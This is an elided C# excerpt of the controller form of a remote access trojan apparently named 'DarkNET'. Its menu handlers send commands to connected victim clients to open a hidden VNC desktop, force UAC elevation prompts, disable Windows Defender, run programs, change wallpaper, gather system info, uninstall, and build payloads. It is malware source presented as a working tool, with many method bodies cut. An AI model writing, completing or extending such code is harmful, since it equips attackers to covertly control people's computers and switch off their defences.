...
namespace Server
{
    ...
    public partial class Form1 : Form
    {
        ...
        private void CheckFiles()
        {
            ...
            {
                MessageBox.Show(ex.Message, "DarkNET", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        ...
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            try
            {
                ...
                foreach (Clients client in GetSelectedClients())
                {
                    FormHVNC remoteDesktop = (FormHVNC)Application.OpenForms["HVNC:" + client.ID];
                    if (remoteDesktop == null)
                    {
                        remoteDesktop = new FormHVNC
                        {
                            Name = "HVNC:" + client.ID,
                            F = this,
                            Text = "HVNC:" + client.ID,
                            ParentClient = client,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "HVNC")
                        };
                        remoteDesktop.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
        ...
        // Add this method inside your Form1 class (call it from your menu/context item click)
        public void RequestSystemInfoForSelectedClient()
        {

        }

        private void SystemInfoToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count == 0) return;
                var client = (Clients)listView1.SelectedItems[0].Tag;
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "systemInfo";
                packet.ForcePathObject("Option").AsString = "get";
                // send using your client.Send method (server-side Clients.Send expects encoded bytes)
        ...
        private void visitWebsiteToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            try
            {
        ...
        private void chatToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            try
            {
                foreach (Clients client in GetSelectedClients())
        ...
        private void GetAdminPrivilegesToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                DialogResult dialogResult = MessageBox.Show(this, "Popup UAC prompt? ", "DarkNET | UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
        ...
        private void DisableWindowsDefenderToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                DialogResult dialogResult = MessageBox.Show(this, "Will only execute on clients with administrator privileges!", "DarkNET | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                if (dialogResult == DialogResult.Yes)
                {
                    try
                    {
        ...
        private void runToolStripMenuItem2_Click_1(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
        ...
        private void setWallpaperToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
        ...
        {
            DialogResult dialogResult = MessageBox.Show(this, "Are you sure you want to unistall", "DarkNET | Unistall", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
            if (dialogResult == DialogResult.Yes)
            {
                try
                {
        ...
        {
#if DEBUG
            MessageBox.Show("You can't build using a 'debug' version, Please use the 'release' version", "DarkNET | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
            return;
#endif
